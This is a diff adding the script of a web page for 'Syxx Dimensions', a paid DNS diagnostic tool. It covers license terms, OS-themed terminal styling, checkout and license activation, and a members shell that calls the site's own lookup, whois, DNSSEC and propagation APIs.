+    + H('3. Who owns it.','The Software is licensed to you, not sold. J.J. keeps all rights to it, including copyright. This license doesn’t give you any rights to the MilkandGin name or logo.')
+    + H('4. Trials and Pro.','The Software may come as a limited trial. Pro features require a valid subscription — <b style="color:#efeafe">$3.95/month or $19.95/year</b>. There is no permanent license. Your license key is stored on your device and is never sent with your DNS data.')
+    + H('5. Your privacy.','Syxx runs its checks on your machine (or, for remote-capable modules, from the syxx.app vantage you invoke). Nothing is sent back except an anonymous usage report with no identifying details, which you can turn off.')
+    + H('6. No warranty.','The Software is provided “as is,” with no guarantees of any kind. It’s a diagnostic aid, not a guarantee that your network is safe.')
+    + H('7. Limits on liability.','As far as the law allows, J.J. isn’t responsible for any indirect or knock-on damages that come from using, or not being able to use, the Software.')
+    + H('8. Export rules.','You agree to follow all applicable export laws when you use the Software.')
+    + H('9. Ending the license.','This license lasts until it ends. It ends automatically if you break these terms, and if it ends you must stop using the Software and delete all copies.')
+    + H('10. Everything else.','If any part of this can’t be enforced, the rest still applies. This is the entire agreement between you and J.J. about the Software.')
+    + `<p style="margin:14px 0 0;color:#8f83b8">© 2026 Joel J. “J.J.” Warne, d/b/a MilkandGin. All rights reserved.</p>`;
+
+  // ---------- OS-aware terminal theming ----------
+  function detectOS(){
+    const p=((navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||navigator.userAgent||'').toLowerCase();
+    if(p.includes('win'))return 'win';
+    if(p.includes('linux')||p.includes('x11')||p.includes('ubuntu')||p.includes('android')||p.includes('cros'))return 'linux';
+    return 'mac';
+  }
+  const osLabel={mac:'macOS',win:'Windows',linux:'Ubuntu (Mint) Linux'};
+  let P, P_UNIX='<span style="color:#2dd4bf">syxx@dimensions</span><span style="color:#6f6597">:~$</span> ',
+      P_PS='<span style="color:#f4f4f4">PS</span> <span style="color:#4ec9b0">C:\\Users\\syxx</span><span style="color:#f4f4f4">&gt;</span> ',
+      P_UBU='<span style="color:#8ae234;font-weight:600">syxx@dimensions</span><span style="color:#eeeeec">:</span><span style="color:#729fcf;font-weight:600">~</span><span style="color:#eeeeec">$</span> ';
+  function initTerm(){term.innerHTML=P+'<span style="color:#8f83b8">'+(P===P_PS?'Windows PowerShell \u00b7 Syxx Dimensions remote module \u00b7 pick a command below.':'Syxx Dimensions remote shell \u00b7 type a command or tap one below.')+'</span>\n\n'+P+'<span class="cursor"></span>';}
+  function themeTerm(os){
+    const frame=document.getElementById('term-frame'),bar=document.getElementById('term-bar'),title=document.getElementById('term-title'),dots=document.getElementById('term-dots');
+    if(os==='win'){P=P_PS;dots.style.display='none';frame.style.background='#012456';frame.style.border='1px solid #0a3a7a';bar.style.background='#023b7a';bar.style.borderBottom='1px solid #0a4a94';title.textContent='Windows PowerShell \u2014 syxx.app';title.style.color='#cfe0f5';term.style.color='#f0f0f4';}
+    else if(os==='linux'){P=P_UBU;dots.style.display='none';frame.style.background='#300a24';frame.style.border='1px solid rgba(233,84,32,.35)';bar.style.background='#2c001e';bar.style.borderBottom='1px solid rgba(233,84,32,.3)';title.textContent='syxx@dimensions: ~ \u2014 Terminal';title.style.color='#e8dbe4';term.style.color='#eeeeec';}
+    else{P=P_UNIX;dots.style.display='flex';frame.style.background='#07040f';frame.style.border='1px solid rgba(148,120,246,.2)';bar.style.background='rgba(20,14,32,.9)';bar.style.borderBottom='1px solid rgba(148,120,246,.14)';title.textContent='syxx@dimensions \u2014 remote shell \u2014 ssh syxx.app';title.style.color='#8f83b8';term.style.color='#c9c1e6';}
+    initTerm();
+  }
+  function themeMTerm(os){
+    const frame=document.getElementById('mterm-frame'),bar=document.getElementById('mterm-bar'),
+          title=document.getElementById('mterm-title'),dots=document.getElementById('mterm-dots'),
+          mt=document.getElementById('mterm');
+    if(!frame)return;
+    if(os==='win'){
+      dots.style.display='none';
+      frame.style.background='#012456';frame.style.border='1px solid #0a3a7a';
+      bar.style.background='#023b7a';bar.style.borderBottom='1px solid #0a4a94';
+      title.textContent='Windows PowerShell — Syxx Members Shell';title.style.color='#cfe0f5';
+      mt.style.color='#f0f0f4';
+    }else if(os==='linux'){
+      dots.style.display='none';
+      frame.style.background='#300a24';frame.style.border='1px solid rgba(233,84,32,.35)';
+      bar.style.background='#2c001e';bar.style.borderBottom='1px solid rgba(233,84,32,.3)';
+      title.textContent='syxx@dimensions: ~ — Members Shell';title.style.color='#e8dbe4';
+      mt.style.color='#eeeeec';
+    }else{
+      dots.style.display='flex';
+      frame.style.background='#07040f';frame.style.border='1px solid rgba(148,120,246,.2)';
+      bar.style.background='rgba(20,14,32,.9)';bar.style.borderBottom='1px solid rgba(148,120,246,.14)';
+      title.textContent='syxx@dimensions — members shell — restricted DNS command set';title.style.color='#8f83b8';
+      mt.style.color='#c9c1e6';
+    }
+  }
+  function setOS(os){
+    themeTerm(os);
+    themeMTerm(os);
+  }
+  const realOS=detectOS();
+  setOS(realOS);
+  (function markHero(){
+    const el=document.getElementById('dl-'+realOS);
+    if(el){el.style.background='linear-gradient(120deg,#7c5cff,#5b3fd6)';el.style.border='none';el.style.boxShadow='0 12px 30px rgba(124,92,255,.4)';}
+    document.getElementById('osnote').textContent=' · '+osLabel[realOS]+' recommended for you';
+  })();
+
+  // ---------- accounts + zero-knowledge masking (mockup) ----------
+  function toast(msg){const t=document.createElement('div');t.textContent=msg;t.style.cssText='position:fixed;left:50%;bottom:34px;transform:translateX(-50%);background:rgba(20,14,32,.97);border:1px solid rgba(124,92,255,.4);color:#efeafe;padding:12px 20px;border-radius:12px;font:600 13px system-ui;box-shadow:0 16px 40px rgba(0,0,0,.5);z-index:99;opacity:0;transition:opacity .2s';document.body.appendChild(t);requestAnimationFrame(()=>t.style.opacity=1);setTimeout(()=>{t.style.opacity=0;setTimeout(()=>t.remove(),250);},2200);}
+  function val(id){const el=document.getElementById(id);return el?el.value.trim():'';}
+  function hshex(s,len){let h=2166136261>>>0;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i);h=Math.imul(h,16777619)>>>0;}let o='',x=h;while(o.length<len){x=Math.imul(x^(x>>>15),2246822519)>>>0;o+=('0000000'+(x>>>0).toString(16)).slice(-8);}return o.slice(0,len);}
+  function seal(s){try{let o='';for(let i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)^(83+i*7)%251);return btoa(o).replace(/[+/=]/g,c=>({'+':'-','/':'_','=':''}[c]));}catch(e){return hshex(s,32);}}
+  function maskEmail(e){if(!e||!e.includes('@'))return '••••••';const parts=e.split('@'),d=parts[1].split('.');return (parts[0][0]||'')+'•••@'+(d[0][0]||'')+'•••.'+d.slice(1).join('.');}
+  function updateStore(){const e=val('ca-email');document.getElementById('store-blind').textContent=e?hshex('bx1|'+e,24):'—';document.getElementById('store-sealed').textContent=e?'enc:v1:'+seal(e).slice(0,26)+'…':'—';}
+
+  let acct={email:'',plan:'yearly'},manRevealed=false;
+  function selPlan(p){acct.plan=p;['monthly','yearly'].forEach(k=>{const el=document.getElementById('plan-'+k),on=k===p;el.style.borderColor=on?'#7c5cff':'rgba(148,120,246,.2)';el.style.background=on?'rgba(124,92,255,.14)':'rgba(255,255,255,.03)';el.setAttribute('aria-pressed',on?'true':'false');});}
+  selPlan('yearly');
+
+  // ---- Stripe checkout: map detected OS + plan to SKU, redirect to /api/checkout ----
+  function getSku(plan){
+    const osPrefix = {mac:'syxx_mac', win:'syxx_win', linux:'syxx_deb'}[realOS] || 'syxx_mac';
+    return osPrefix + '_' + plan + '_sub';
+  }
+  function startCheckout(plan){
+    const sku = getSku(plan);
+    const url = '/api/checkout?sku=' + encodeURIComponent(sku);
+    const errEl = document.getElementById('checkout-error');
+    if(errEl) errEl.style.display = 'none';
+    fetch(url, {redirect:'manual'})
+      .then(r => {
+        if(r.type === 'opaqueredirect'){ window.location.href = url; }
+        else { if(errEl) errEl.style.display = 'block'; }
+      })
+      .catch(() => { if(errEl) errEl.style.display = 'block'; });
+  }
+  function doCreate(){
+    const e=val('ca-email');
+    if(!e||!e.includes('@')){toast('Enter a valid email');return;}
+    acct.email=e;
+    startCheckout(acct.plan);
+  }
+  function renderManage(){
+    const e=acct.email,yearly=acct.plan==='yearly';manRevealed=false;
+    document.getElementById('man-email').textContent=maskEmail(e);
+    document.getElementById('man-reveal').textContent='reveal';
+    document.getElementById('man-plan').textContent='PRO · '+(yearly?'Yearly':'Monthly');
+    document.getElementById('man-price').textContent=yearly?'$19.95 / year':'$3.95 / month';
+    const d=new Date();d.setMonth(d.getMonth()+(yearly?12:1));
+    document.getElementById('man-next').textContent=d.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
+    acct.key='SYXX-PRO-'+hshex(e||'x',12).toUpperCase().match(/.{1,4}/g).join('-');
+    document.getElementById('man-key').textContent='SYXX-PRO-••••-••••-••••';
+  }
+  function toggleReveal(){manRevealed=!manRevealed;document.getElementById('man-email').textContent=manRevealed?acct.email:maskEmail(acct.email);document.getElementById('man-reveal').textContent=manRevealed?'hide':'reveal';document.getElementById('man-key').textContent=manRevealed?acct.key:'SYXX-PRO-••••-••••-••••';if(manRevealed)toast('Unsealed locally with your passphrase');}
+  function doSignin(){
+    const key=val('si-key');
+    if(!key){toast('Enter your license key');return;}
+    fetch('/api/auth/activate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:key})})
+      .then(r=>{if(!r.ok)throw r;return r.json()})
+      .then(data=>{
+        acct.email=data.plan||'pro';acct.plan='yearly';acct.token=data.token;
+        try{localStorage.setItem('syxx_session',data.token);}catch(e){}
+        renderManage();afterLogin();
+        toast('License activated · session sealed');show('members');
+      })
+      .catch(err=>{
+        if(err.status===402) toast('Invalid or inactive license key');
+        else toast('Activation failed — check your key and try again');
+      });
+  }
+  function afterLogin(){renderMembers();document.getElementById('nav-account').style.display='inline-flex';}
+  function signOut(){document.getElementById('nav-account').style.display='none';acct={email:'',plan:'yearly'};mtermInit=false;show('cover');}
+
+  // ---------- members governed DNS terminal ----------
+  const MP='<span style="color:#2dd4bf">syxx@dimensions</span><span style="color:#6f6597">:~$</span> ';
+  let mtermInit=false;
+  function renderMembers(){document.getElementById('mem-email').textContent=maskEmail(acct.email);document.getElementById('mem-plan').textContent='PRO · '+(acct.plan==='yearly'?'Yearly':'Monthly');if(!mtermInit){minit();mtermInit=true;}}
+  function mel(){return document.getElementById('mterm');}
+  function minit(){mel().innerHTML=MP+'<span style="color:#8f83b8">Governed DNS shell · button-only mode · set a domain, then pick a command. Session: '+(hasSession()?'<span style="color:#2dd4bf">active</span>':'<span style="color:#ff4d6d">not activated</span>')+'</span>\n';}
+  function mclear(){minit();}
+  function mrun(typed,out){const t=mel();t.innerHTML+=MP+typed+'\n'+out+'\n\n';t.scrollTop=t.scrollHeight;}
+  const G=s=>'<span style="color:#2dd4bf">'+s+'</span>',R=s=>'<span style="color:#ff4d6d">'+s+'</span>',Y=s=>'<span style="color:#f7931e">'+s+'</span>',M=s=>'<span style="color:#8f83b8">'+s+'</span>',D=s=>'<span style="color:#6f6597">'+s+'</span>';
+  const MEMBERS_PRO = new Set(['mirror','warp']);
+
+  // Free-tier API helper (no auth, rate-limited per IP)
+  async function freeAPI(path, params){
+    const qs = new URLSearchParams(params).toString();
+    const url = qs ? path+'?'+qs : path;
+    const r = await fetch(url);
+    if(!r.ok){ const e = await r.json().catch(()=>({})); throw new Error(e.error||r.statusText); }
+    return r.json();
+  }
+  function fmtRecords(records){
+    if(!records||!records.length) return D('  (no records)');
+    return records.map(r=>{ const v = typeof r.value==='object' ? JSON.stringify(r.value) : r.value; return '  '+(r.ttl||300)+'\t'+(r.type||'?')+'\t'+v; }).join('\n');
+  }
+
+  async function runCmd(name){
+    const d=val('m-domain')||'',ty=(document.getElementById('m-type')||{}).value||'A';
+    const needs=['prophet','mirror','warp','nslookup','dig','dnstwist','whois','dnssec'];
+    // Input validation: require domain
+    if(needs.includes(name)&&!d){mrun(name,Y('! set a domain in the field above first'));return;}
+    // Session gate: all commands require an active session
+    if(!hasSession()){
+      mrun(name,R('✗ session not active.')+' <a href="#signin" data-action="show" data-arg="signin" style="color:#a78bff">Activate your license key →</a>');
+      return;
+    }
+    // Pro gate for paid commands
+    if(MEMBERS_PRO.has(name)){
+      // Real API calls for Pro commands
+      if(name==='mirror'){
+        mrun('mirror '+d+' [Pro]', M('Calling /api/diff for '+d+'…'));
+        fetch('/api/diff',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('syxx_session')},body:JSON.stringify({domain:d,type:ty})})
+          .then(r=>{if(!r.ok)throw r;return r.json();})
+          .then(data=>{mrun('',G('✓ '+data.conclusion+' — '+(data.match?'remote matches origin':'content differs'))+'\n  sha256: '+(data.cleanVantage||'…')+'\n  assessment: '+(data.assessment||'…'));})
+          .catch(()=>{mrun('',R('API error — check your session and try again.'));});
+        return;
+      }
+      if(name==='warp'){
+        mrun('warp https://'+d+' [Pro]', M('Calling /api/warp/raw for '+d+'…'));
+        fetch('/api/warp/raw?url='+encodeURIComponent('https://'+d),{headers:{'Authorization':'Bearer '+localStorage.getItem('syxx_session')}})
+          .then(r=>{if(!r.ok)throw r;return r.json();})
+          .then(data=>{mrun('',G('✓ fetched '+data.content?.length||0+' bytes')+'\n  sha256: '+((data.sha256||'').substring(0,16))+'…\n  vantage: '+(data.vantage||'server'));})
+          .catch(()=>{mrun('',R('API error — check your session and try again.'));});
+        return;
+      }
+    }
+    // Free commands: call real APIs
+    const tok = localStorage.getItem('syxx_session');
+    if(name==='prophet'){
+      mrun('prophet '+d, M('Querying resolvers from the syxx.app vantage…'));
+      fetch('/api/investigate?domain='+encodeURIComponent(d),{headers:{'Authorization':'Bearer '+tok}})
+        .then(r=>{if(!r.ok)throw r;return r.json();})
+        .then(data=>{
+          const ips = (data.ipv4||[]).map(r=>r.ip).filter(Boolean);
+          const unique = [...new Set(ips)];
+          const agree = unique.length<=1;
+          mrun('',G((agree?'✓':'⚠')+' '+unique.length+' unique answer(s) from '+(data.ipv4||[]).length+' resolvers')+'\n  consensus: '+(data.consensus||'…')+'\n  '+(data.dnssec?.valid?G('DNSSEC validated'):Y('DNSSEC not validated')));
+        })
+        .catch(err=>{
+          if(err.status===402) mrun('',R('payment required — your session may have expired.')+' <a href="#signin" data-action="show" data-arg="signin" style="color:#a78bff">Re-activate →</a>');
+          else mrun('',R('API error — check connection and try again.'));
+        });
+      return;
+    }
+    // Remaining commands: real API calls
+    switch(name){
+      case 'help':
+        mrun('help',M('Enabled commands (all live APIs):')+'\n  prophet &lt;domain&gt;    resolver consensus   '+G('live')+'\n  mirror  &lt;domain&gt;    '+Y('[Pro]')+' remote vs origin   '+G('live')+'\n  warp    &lt;domain&gt;    '+Y('[Pro]')+' source diff   '+G('live')+'\n  nslookup &lt;domain&gt;   DNS lookup (uses Type)   '+G('live')+'\n  dig &lt;domain&gt;        full record query   '+G('live')+'\n  whois &lt;domain&gt;      registration record   '+G('live')+'\n  email &lt;domain&gt;      SPF/DMARC/DKIM   '+G('live')+'\n  subdomains &lt;domain&gt;  CT log enumeration   '+G('live')+'\n  propagation &lt;domain&gt; global check   '+G('live')+'\n  firewall             filter detection   '+G('live')+'\n  dnssec &lt;domain&gt;     chain validation   '+G('live')+'\n'+D('Local-only: portal · glutton · cage'));
+        break;
+      case 'conclude':
+        mrun('conclude',M('Combined conclusions require the desktop investigation pipeline. Run individual tools above for server-vantage results.'));
+        break;
+      case 'nslookup':
+        mrun('nslookup -type='+ty+' '+d, M('Querying via /api/lookup…'));
+        try{ const data=await freeAPI('/api/lookup',{domain:d,type:ty}); mrun('',data.server+'#53\n\n'+(data.rcodeName==='NOERROR'?G(';; '+data.rcodeName):Y(';; '+data.rcodeName))+'\n'+fmtRecords(data.records)); }catch(e){ mrun('',R('lookup failed: '+e.message)); }
+        break;
+      case 'dig':
+        mrun('dig '+d+' '+ty, M('Querying via /api/lookup…'));
+        try{ const data=await freeAPI('/api/lookup',{domain:d,type:ty}); mrun('',G(';; ANSWER SECTION:')+'\n'+fmtRecords(data.records)+'\n\n;; SERVER: '+data.server+'\n;; RCODE: '+data.rcodeName+(data.ad?' ;; '+G('AD flag set'):'')); }catch(e){ mrun('',R('dig failed: '+e.message)); }
+        break;
+      case 'whois':
+        mrun('whois '+d, M('Querying via /api/whois…'));
+        try{ const data=await freeAPI('/api/whois',{domain:d}); const lines=[]; if(data.registrar) lines.push('Registrar: '+data.registrar); if(data.created) lines.push('Created:   '+data.created); if(data.expires) lines.push('Expires:   '+data.expires); if(data.status?.length) lines.push('Status:    '+data.status.join(', ')); if(data.nameservers?.length) lines.push('NS:        '+data.nameservers.slice(0,4).join(', ')); lines.push(D('Source: '+data.source)); mrun('',lines.join('\n')); }catch(e){ mrun('',R('whois failed: '+e.message)); }
+        break;
+      case 'email':
+        mrun('email-auth '+d, M('Checking SPF/DMARC/DKIM…'));
+        try{ const data=await freeAPI('/api/email-auth',{domain:d}); const lines=[]; if(data.spf) lines.push('SPF:   '+(data.spf.conclusion==='pass'?G('✓'):R('✗'))+' '+(data.spf.policy||'none')); if(data.dmarc) lines.push('DMARC: '+(data.dmarc.conclusion==='pass'?G('✓'):R('✗'))+' '+(data.dmarc.policy||'none')+' pct='+(data.dmarc.pct||'?')); if(data.dkim) lines.push('DKIM:  '+(data.dkim.conclusion==='pass'?G('✓'):Y('?'))+' selector='+(data.dkim.selector||'none')); lines.push('Overall: '+(data.overall==='pass'?G(data.overall):R(data.overall||'unknown'))); mrun('',lines.join('\n')); }catch(e){ mrun('',R('email-auth failed: '+e.message)); }
+        break;
+      case 'subdomains':
+        mrun('subdomains '+d, M('Enumerating via CT logs…'));
+        try{ const data=await freeAPI('/api/subdomains',{domain:d}); const subs=(data.subdomains||[]).slice(0,20); mrun('',G(data.total+' subdomains found')+'\n'+subs.map(s=>'  '+(typeof s==='string'?s:(s.name||s))).join('\n')+(data.truncated?'\n'+Y('(truncated)'):'')); }catch(e){ mrun('',R('enumeration failed: '+e.message)); }
+        break;
+      case 'propagation':
+        mrun('propagation '+d, M('Checking 17 global resolvers…'));
+        try{ const data=await freeAPI('/api/propagation',{domain:d,type:ty}); const ok=data.resolvers?.filter(r=>r.status==='ok')||[]; mrun('',G(data.successCount+'/'+data.totalResolvers+' responded')+' · '+data.consensus+' · '+data.propagationPct+'%\n'+ok.slice(0,8).map(r=>'  '+r.label.padEnd(16)+' '+(r.records?.[0]?.value||'—')+' ('+r.time_ms+'ms)').join('\n')); }catch(e){ mrun('',R('propagation failed: '+e.message)); }
+        break;
+      case 'firewall':
+        mrun('firewall-test', M('Testing DNS filtering…'));
+        try{ const data=await freeAPI('/api/firewall-test',{}); const filtered=(data.results||[]).filter(r=>r.filtered); mrun('',(data.assessment==='filtered'?R('FILTERED'):G('OPEN'))+' — '+filtered.length+'/'+(data.results||[]).length+' blocked\n'+(data.results||[]).slice(0,10).map(r=>'  '+(r.filtered?R('✗'):G('✓'))+' '+(r.domain||'').padEnd(28)+' '+(r.category||'')).join('\n')); }catch(e){ mrun('',R('firewall test failed: '+e.message)); }
+        break;
+      case 'dnssec':
+        mrun('dnssec '+d, M('Validating DNSSEC chain of trust…'));
+        try{ const data=await freeAPI('/api/dnssec',{domain:d}); const steps=(data.chain||[]).map(s=>'  '+s.zone.padEnd(20)+' '+s.step.padEnd(16)+' '+(s.status==='valid'?G('✓ valid'):s.status==='invalid'?R('✗ invalid'):Y('? '+s.status))); mrun('',(data.conclusion==='valid'?G('✓ DNSSEC VALID'):data.conclusion==='invalid'?R('✗ DNSSEC INVALID'):data.conclusion==='unsigned'?Y('UNSIGNED'):Y('INCONCLUSIVE'))+'\n  Algorithm: '+(data.algorithm||'none')+'\n'+steps.join('\n')); }catch(e){ mrun('',R('dnssec failed: '+e.message)); }
+        break;
+      default:
+        mrun(name, R('command not available in this governed shell'));
+    }
+  }
+
+  // ---------- delegated event handling ----------
+  // Every interactive control on this page is a real <a href> or
+  // <button type="button"> carrying data-action / data-arg. Nothing uses an
+  // inline on* attribute, including the controls written into innerHTML at
+  // runtime, so a script-src CSP without 'unsafe-inline' can be turned on
+  // without breaking the page. Native anchors and buttons already answer
+  // Enter/Space, so no keydown shim is needed.
+  const ACTIONS = {
+    show,
+    run,
+    runCmd,
+    selPlan,
+    startCheckout,
+    toast,
+    signOut:      () => signOut(),
+    mclear:       () => mclear(),
+    doSignin:     () => doSignin(),
+    doCreate:     () => doCreate(),
+    toggleReveal: () => toggleReveal(),
+  };
+  const caEmail = document.getElementById('ca-email');
+  if(caEmail) caEmail.addEventListener('input', updateStore);
+  document.addEventListener('click', function(ev){
+    const el = ev.target.closest('[data-action]');
+    if(!el) return;
+    const fn = ACTIONS[el.getAttribute('data-action')];
+    if(!fn) return;
+    // Anchors here are in-page panel switches; stop the browser from also
+    // jumping to the fragment so the scroll position stays under our control.
+    if(el.tagName === 'A') ev.preventDefault();
+    fn(el.getAttribute('data-arg') || undefined);
+  });
+</script>
+</body>
+</html>
